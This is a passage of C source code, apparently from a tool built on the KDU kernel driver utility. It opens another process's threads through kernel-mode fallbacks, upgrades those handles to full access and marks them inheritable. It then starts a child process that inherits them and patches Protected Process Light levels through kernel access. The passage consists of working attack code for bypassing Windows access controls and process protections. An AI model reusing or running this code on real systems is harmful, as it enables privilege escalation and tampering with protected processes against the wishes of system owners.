		HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		if (hThreadSnap == INVALID_HANDLE_VALUE) {
			supPrintfEvent(kduEventError, 
                "[!] Failed to create thread snapshot. Error: %lu\n", GetLastError());
			return FALSE;
		}
		THREADENTRY32 te32;
		te32.dwSize = sizeof(THREADENTRY32);
		if (Thread32First(hThreadSnap, &te32)) {
			do {
				if (te32.th32OwnerProcessID == TargetProcessId) {
					
                    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                    if (hThread == NULL) {
                        
                        // fallback, should work for most
						hThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, te32.th32ThreadID);

                        if (hThread == NULL) {
                            printf_s("[-] Target process %llu cannot be opened via user-mode, fallback to KDUOpenProcess()\r\n", TargetProcessId);

							// 2nd fallback also using KDU OpenProcess
							if (!KDUVerifyProviderCallbacksForOpenProcess(Context)) { // ignore a thread if the provider does not support arbitrary process handle acquisition
                                printf_s("[-] Warning: Selected provider does not support arbitrary thread handle acquisition, not inheriting thread %lu.\r\n", te32.th32ThreadID);
                                continue;
                            }
                            if (!KDUOpenProcess(Context, (HANDLE)TargetProcessId, THREAD_ALL_ACCESS, &hThread)) {
                                printf_s("[-] Warning: Failed to open thread %lu via user- and kernel-mode, not inheriting it.", te32.th32ThreadID);
                                continue;
                            }
                        }
                    }
					if (hThread == NULL) {
						printf_s("[!] Failed to open thread with TID %lu. Error: %lu\n", te32.th32ThreadID, GetLastError());
						continue;
					}
                    
                    if (threadCount >= MAX_THREADS) {
                        printf_s("[-] Warning: Reached MAX_THREADS (%u), continuing to patching...\n", MAX_THREADS);
                        CloseHandle(hThread);
                        break;
                    }

					threadHandles[threadCount++] = hThread;
				}
			} while (Thread32Next(hThreadSnap, &te32));
            CloseHandle(hThreadSnap);
		}
		else {
			supPrintfEvent(kduEventError, 
                "[!] Invalid thread snapshot. Error: %lu\n", GetLastError());
			CloseHandle(hThreadSnap);
			return FALSE;
		}

        // check if the thread handles have THREAD_ALL_ACCESS rights, if not, patch it
        int err = 0;
        for (size_t i = 0; i < threadCount; i++) {
            HANDLE hThread = threadHandles[i];
            if (KDUSetHandleInheritable(hThread)) {
                if (KDUSetAccessRights(Context, hThread, THREAD_ALL_ACCESS)) {
					printf_s("[+] Thread handle %p set to THREAD_ALL_ACCESS and inheritable.\n", hThread);
				}
				else {
				    printf_s("[!] Failed to set thread handle %p to THREAD_ALL_ACCESS.\n", hThread);
					err++;
				}
            }
            else {
				printf_s("[!] Failed to set thread handle %p as inheritable.\n", hThread);
                err++;
            }
        }
        if (err > 0) {
            printf_s("[-] Warning: Continuing despite having %i erroneous thread handle(s) out of %llu.\n", err, threadCount);
        }
	}

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // check if process can be started (no PPL) or created suspended to patch PPL
    DWORD creationOptions;
    if (PPLLevel > 0) {
        wprintf_s(L"[+] Creating suspended Process '%s'\r\n", CommandLine);
        creationOptions = CREATE_SUSPENDED;
    }
    else {
        wprintf_s(L"[+] Creating Process '%s'\r\n", CommandLine);
        creationOptions = NULL;
    }

    if (!CreateProcess(
        NULL,               // No module name (use command line)
        CommandLine,        // Command line
        NULL,               // Process handle not inheritable
        NULL,               // Thread handle not inheritable
        TRUE,               // Do inherit inheritable handles
        creationOptions,    // according to given PPL, see above
        NULL,               // Use parent's environment block
        NULL,               // Use parent's starting directory 
        &si,                // Pointer to STARTUPINFO structure
        &pi))               // Pointer to PROCESS_INFORMATION structure
    {
        supShowWin32Error("[!] Failed to create process", GetLastError());
        return FALSE;
    }
    printf_s("[+] Created Process with PID %lu\r\n", pi.dwProcessId);

    if (PPLLevel >= 7) {
        PPLLevel = 7;
        printf_s("[!] Capped the PPL level at 7\n");
    }

    // patch PPL and resume
    if (PPLLevel > 0 and PPLLevel < 8) {

        DWORD dwThreadResumeCount = 0;
        PS_PROTECTED_SIGNER signer = (PS_PROTECTED_SIGNER)PPLLevel;
        PS_PROTECTED_TYPE type = PsProtectedTypeProtectedLight;

        if (!KDUControlProcessProtections(Context, pi.dwProcessId, signer, type)) {
            supShowWin32Error("[!] Failed to set process as PPL", GetLastError());
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }

        dwThreadResumeCount = ResumeThread(pi.hThread);
        if (dwThreadResumeCount != 1) {
            supPrintfEvent(kduEventError, 
                "[!] Failed to resume process: %lu | 0x%lX\n", dwThreadResumeCount, GetLastError());
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }
    }

    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}